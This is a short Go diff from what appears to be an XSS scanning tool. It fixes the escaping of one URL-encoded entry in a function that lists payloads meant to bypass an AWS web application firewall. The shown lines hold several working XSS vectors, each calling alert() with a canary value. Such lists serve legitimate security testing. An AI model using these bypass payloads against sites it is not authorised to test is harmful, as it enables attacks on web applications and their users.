@@ -45,7 +45,7 @@ func getAWSBypassPayloads(canary string) []string {
 		fmt.Sprintf(`<svg	onload=alert('%s')>`, canary), // tab char
 		fmt.Sprintf(`<details open ontoggle=alert('%s')>`, canary),
 		fmt.Sprintf(`<body onpageshow=alert('%s')>`, canary),
-		fmt.Sprintf(`%3Csvg/onload=alert('%s')%3E`, canary),
+		fmt.Sprintf(`%%3Csvg/onload=alert('%s')%%3E`, canary),
 		fmt.Sprintf(`<marquee onstart=alert('%s')>`, canary),
 		fmt.Sprintf(`<a href=javascript:alert('%s')>`, canary),
 		fmt.Sprintf(`<svg><desc><![CDATA[</desc><svg/onload=alert('%s')>]]></svg>`, canary),
